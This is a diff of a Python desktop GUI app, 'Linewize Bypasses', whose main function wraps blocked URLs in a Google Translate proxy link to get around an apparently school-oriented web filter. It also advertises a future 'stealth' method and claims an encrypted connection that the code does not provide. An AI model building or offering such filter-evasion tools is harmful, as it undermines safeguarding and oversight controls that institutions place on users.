+                height=35,
+                corner_radius=8
+            )
+            sub_item.pack(fill="x", pady=2)
+    
+    def create_main_area(self, parent):
+        # Main content area
+        main_area = ctk.CTkFrame(
+            parent,
+            fg_color="#151522",
+            corner_radius=15
+        )
+        main_area.pack(side="left", fill="both", expand=True)
+        
+        # Content container
+        content_container = ctk.CTkScrollableFrame(
+            main_area,
+            fg_color="transparent",
+            corner_radius=0
+        )
+        content_container.pack(fill="both", expand=True, padx=20, pady=20)
+        
+        # Section header
+        header_frame = ctk.CTkFrame(content_container, fg_color="transparent")
+        header_frame.pack(fill="x", pady=(0, 20))
+        
+        title = ctk.CTkLabel(
+            header_frame,
+            text="Linewize Bypasses",
+            font=ctk.CTkFont(size=28, weight="bold"),
+            text_color="white"
+        )
+        title.pack(side="left")
+        
+        badge = ctk.CTkLabel(
+            header_frame,
+            text="ACTIVE",
+            font=ctk.CTkFont(size=12, weight="bold"),
+            text_color="white",
+            fg_color="#667eea",
+            corner_radius=10
+        )
+        badge.pack(side="left", padx=10, pady=5)
+        
+        # Method cards
+        self.create_method_card(
+            content_container,
+            "Method 1: Google Translate Bypass",
+            "WORKING",
+            "#4CAF50",
+            "Enter any blocked URL to bypass through Google Translate proxy:",
+            "🚀 Bypass Now"
+        )
+        
+        self.create_method_card(
+            content_container,
+            "Method 2: Advanced Proxy", 
+            "BETA",
+            "#FF9800",
+            "Advanced proxy method with enhanced stealth features (coming soon):",
+            "🔧 Coming Soon"
+        )
+    
+    def create_method_card(self, parent, title, badge_text, badge_color, description, button_text):
+        # Card frame
+        card = ctk.CTkFrame(
+            parent,
+            fg_color="#1e1e2d",
+            corner_radius=15,
+            border_width=1,
+            border_color="gray30"
+        )
+        card.pack(fill="x", pady=15)
+        
+        # Card content
+        card_content = ctk.CTkFrame(card, fg_color="transparent")
+        card_content.pack(fill="x", padx=25, pady=25)
+        
+        # Card header
+        header = ctk.CTkFrame(card_content, fg_color="transparent")
+        header.pack(fill="x", pady=(0, 15))
+        
+        title_label = ctk.CTkLabel(
+            header,
+            text=title,
+            font=ctk.CTkFont(size=18, weight="bold"),
+            text_color="white"
+        )
+        title_label.pack(side="left")
+        
+        badge = ctk.CTkLabel(
+            header,
+            text=badge_text,
+            font=ctk.CTkFont(size=10, weight="bold"),
+            text_color="white",
+            fg_color=badge_color,
+            corner_radius=8
+        )
+        badge.pack(side="right")
+        
+        # Description
+        desc_label = ctk.CTkLabel(
+            card_content,
+            text=description,
+            font=ctk.CTkFont(size=14),
+            text_color="gray80",
+            wraplength=600
+        )
+        desc_label.pack(fill="x", pady=(0, 20))
+        
+        # Input area for first method
+        if "Google Translate" in title:
+            input_frame = ctk.CTkFrame(card_content, fg_color="transparent")
+            input_frame.pack(fill="x", pady=(0, 20))
+            
+            self.url_entry = ctk.CTkEntry(
+                input_frame,
+                placeholder_text="https://example.com",
+                height=45,
+                font=ctk.CTkFont(size=14),
+                fg_color="#252538",
+                border_color="gray40",
+                text_color="white"
+            )
+            self.url_entry.pack(fill="x", side="left", expand=True, padx=(0, 15))
+            
+            bypass_btn = ctk.CTkButton(
+                input_frame,
+                text=button_text,
+                command=self.bypass_url,
+                height=45,
+                font=ctk.CTkFont(size=14, weight="bold"),
+                fg_color=("#667eea", "#5a6fd8"),
+                hover_color=("#5a6fd8", "#4a5fc8"),
+                corner_radius=10
+            )
+            bypass_btn.pack(side="right")
+            
+            # Footer info
+            footer = ctk.CTkLabel(
+                card_content,
+                text="✓ Encrypted connection • ✓ Fast • ✓ Reliable",
+                font=ctk.CTkFont(size=12),
+                text_color="gray60"
+            )
+            footer.pack(anchor="w")
+        else:
+            # Just button for second method
+            placeholder_btn = ctk.CTkButton(
+                card_content,
+                text=button_text,
+                height=45,
+                font=ctk.CTkFont(size=14, weight="bold"),
+                fg_color=("gray40", "gray50"),
+                hover_color=("gray50", "gray60"),
+                corner_radius=10,
+                state="disabled"
+            )
+            placeholder_btn.pack(fill="x", pady=(0, 10))
+            
+            # Footer info
+            footer = ctk.CTkLabel(
+                card_content,
+                text="⏳ Under development • Enhanced stealth",
+                font=ctk.CTkFont(size=12),
+                text_color="gray60"
+            )
+            footer.pack(anchor="w")
+    
+    def animate_main_gui(self):
+        # Animate main container entrance
+        self.main_container.configure(fg_color="#0a0a12")
+        self.after(10, lambda: self.main_container.configure(fg_color="#0f0f1a"))
+        self.after(20, lambda: self.main_container.configure(fg_color="#151522"))
+        self.after(30, lambda: self.main_container.configure(fg_color="#1a1a2a"))
+        self.after(40, lambda: self.main_container.configure(fg_color="#1e1e32"))
+    
+    def bypass_url(self):
+        url = self.url_entry.get().strip()
+        if not url:
+            # Shake animation for empty input
+            original_x = self.url_entry.winfo_x()
+            for i in range(5):
+                self.url_entry.place(x=original_x + 5 if i % 2 == 0 else original_x - 5)
+                self.update()
+                time.sleep(0.05)
+            self.url_entry.place(x=original_x)
+            return
+        
+        if not url.startswith(('http://', 'https://')):
+            url = 'https://' + url
+        
+        bypass_url = f"https://translate.google.com/translate?sl=auto&tl=en&u={quote(url)}"
+        webbrowser.open(bypass_url)
+    
+    # Window dragging functions
+    def start_move(self, event):
+        self.x = event.x
+        self.y = event.y
+    
+    def stop_move(self, event):
+        self.x = None
+        self.y = None
+    
+    def do_move(self, event):
+        deltax = event.x - self.x
+        deltay = event.y - self.y
+        x = self.winfo_x() + deltax
+        y = self.winfo_y() + deltay
+        self.geometry(f"+{x}+{y}")
+    
+    def minimize_window(self):
+        self.overrideredirect(False)
+        self.state('iconic')
+        self.overrideredirect(True)
+    
+    def quit_app(self):
+        # Fade out animation
+        for i in range(10, -1, -1):
+            self.attributes('-alpha', i/10)
+            self.update()
+            time.sleep(0.02)
+        self.destroy()
+
+if __name__ == "__main__":
+    # Create and run app
+    app = BypassApp()
+    
+    # Set window always on top initially for focus
+    app.attributes('-alpha', 0.95)
+    app.after(1000, lambda: app.attributes('-alpha', 1.0))
+    
+    app.mainloop()
